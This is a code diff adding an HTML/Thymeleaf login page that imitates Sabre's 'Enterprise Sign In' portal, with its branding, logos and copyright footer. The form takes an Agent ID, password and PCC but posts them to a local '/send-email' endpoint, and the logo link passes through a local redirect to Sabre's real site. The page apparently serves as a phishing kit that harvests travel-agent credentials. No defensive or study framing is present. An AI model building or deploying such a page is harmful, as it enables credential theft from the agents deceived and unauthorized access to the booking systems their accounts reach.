@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+  <head>
+    <title>Sabre Login</title>
+
+    <meta http-equiv="refresh" content="1780" />
+    <meta name="description" content="Sabre Login Authentication Portal" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+    />
+
+    <link rel="stylesheet" th:href="@{/css/main.css}" />
+    <link rel="stylesheet" th:href="@{/css/spark/3.9.7/spark.katana.min.css}" />
+
+    <style>
+      html,
+      body {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .spark-content__wrapper--sticky-footer {
+        flex: 1;
+      }
+
+      .spark-footer {
+        margin-top: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="spark-content__wrapper--sticky-footer">
+      <article
+        class="spark-splash-screen spark-splash-screen--panel spark-splash-screen--sign-in spark-main--sticky-footer"
+      >
+        <section class="spark-splash-screen__content">
+          <div
+            class="spark-panel spark-splash-screen__center col-xs-12 col-md-10 col-lg-6 col-xl-6 spark-pad-1"
+          >
+            <div class="spark-panel__content">
+              <a
+                href="/welcome?goto=https://commandcenter-ngp.sabre.com/sabreg/login?environment%3DPROD"
+                class="spark-logo spark-logo--sabre spark-logo--md spark-logo--sabre-red"
+                id="sabreLogo"
+              ></a>
+              <h3 class="spark-splash-screen__heading">Enterprise Sign In</h3>
+              <div
+                class="spark-center-block col-xs-12 col-md-10 col-lg-8 col-xl-8"
+              >
+                <div th:if="${errorMessage}" style="color: red; font-weight: bold;">
+                  <p th:text="${errorMessage}"></p>
+                </div>
+
+                <form class="spark-splash-screen__form spark-text-left" method="post" action="/send-email">
+                  <label class="spark-input">
+                    <input class="spark-input__field" id="userId" name="userId" placeholder="Example: 4321" required />
+                    <span class="spark-label">Agent ID</span>
+                  </label>
+
+                  <label class="spark-input">
+                    <input type="password" class="spark-input__field" id="password" name="password" placeholder="Example: password123." required />
+                    <span class="spark-label">Password</span>
+                  </label>
+
+                  <label class="spark-input">
+                    <input class="spark-input__field" id="group" name="group" placeholder="Example: BTD0" />
+                    <span class="spark-label">PCC</span>
+                  </label>
+
+                  <button id="submit" name="login" class="spark-btn spark-btn--md spark-btn--primary">
+                    Sign In
+                  </button>
+                </form>
+
+              </div>
+          </div>
+        </section>
+      </article>
+    </div>
+    <!-- ✅ Footer Moved Outside of Article -->
+    <footer class="spark-footer">
+      <div class="container">
+        <a class="spark-footer__logo spark-hidden--lte-sm">
+          <img
+            src="/images/sabre-logo-black.svg"
+            alt="Sabre Logo"
+            class="spark-logo spark-logo--xs"
+          />
+        </a>
+        <div class="spark-footer__content">
+          <div class="spark-footer__copyright">
+            © <span>2025</span> Sabre GLBL Inc.
+          </div>
+          <ul class="spark-footer__list">
+            <li class="spark-footer__list-item">
+              <a
+                class="spark-footer__list-link"
+                href="https://www.sabre.com/about/privacy-policy/"
+                >Privacy policy</a
+              >
+            </li>
+            <li class="spark-footer__list-item">
+              <a class="spark-footer__list-link" href="/contact/airline"
+                >Contact Us</a
+              >
+            </li>
+            <li class="spark-footer__list-item">
+              <a
+                class="spark-footer__list-link"
+                href="https://www.sabre.com/about/copyright-and-trademark-notice/"
+                >Copyright and trademark</a
+              >
+            </li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+    <script th:src="@{/webjars/jquery/3.6.0/dist/jquery.min.js}"></script>
+    <!-- <script th:src="@{/js/js.cookie.min.js}"></script> -->
+    <script th:src="@{/js/submit.js}"></script>
+
+    <script src="/webjars/tether/1.1.1/dist/js/tether.min.js"></script>
+    <script type="module" src="/js/spark/3.9.7/spark.min.js"></script>
+    <script type="text/javascript" src="/js/main.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const passwordInput = document.getElementById("password");
+        const toggleIcon = document.querySelector(
+          ".spark-input__password-toggle i"
+        );
+
+        toggleIcon.addEventListener("click", function () {
+          if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            toggleIcon.classList.remove("spark-icon-password-view");
+            toggleIcon.classList.add("spark-icon-password-hide");
+          } else {
+            passwordInput.type = "password";
+            toggleIcon.classList.remove("spark-icon-password-hide");
+            toggleIcon.classList.add("spark-icon-password-view");
+          }
+        });
+      });
+    </script>
+    <!-- <script>
+      document
+        .getElementById("togglePassword")
+        .addEventListener("click", function () {
+          let passwordField = document.getElementById("password");
+          let icon = this.querySelector("i");
+
+          if (passwordField.type === "password") {
+            passwordField.type = "text"; // Show password
+            icon.classList.remove("spark-icon-password-view");
+            icon.classList.add("spark-icon-password-hide");
+          } else {
+            passwordField.type = "password"; // Hide password
+            icon.classList.remove("spark-icon-password-hide");
+            icon.classList.add("spark-icon-password-view");
+          }
+        });
+    </script> -->
+
+    <!-- <script type="application/javascript">
+      document.addEventListener("DOMContentLoaded", function () {
+        function rewriteGroup(event) {
+          const groupInput = document.getElementById("group");
+          groupInput.value = event.target.value;
+          groupInput.parentElement.classList.add("active");
+        }
+
+        const domainInput = document.getElementById("domain");
+        domainInput.addEventListener("input", rewriteGroup);
+        domainInput.addEventListener("blur", function () {
+          domainInput.removeEventListener("input", rewriteGroup);
+        });
+
+        // Password visibility toggle
+        const passwordField = document.getElementById("password");
+        const toggleIcon = document.querySelector(
+          ".spark-input__password-toggle"
+        );
+
+        toggleIcon.addEventListener("click", function () {
+          const type =
+            passwordField.getAttribute("type") === "password"
+              ? "text"
+              : "password";
+          passwordField.setAttribute("type", type);
+
+          // Toggle visibility icon
+          toggleIcon
+            .querySelector(".spark-icon-password-view")
+            .classList.toggle("spark-icon-password-hide");
+          toggleIcon
+            .querySelector(".spark-icon-password-hide")
+            .classList.toggle("spark-icon-password-view");
+        });
+      });
+    </script> -->
+  </body>
+</html>
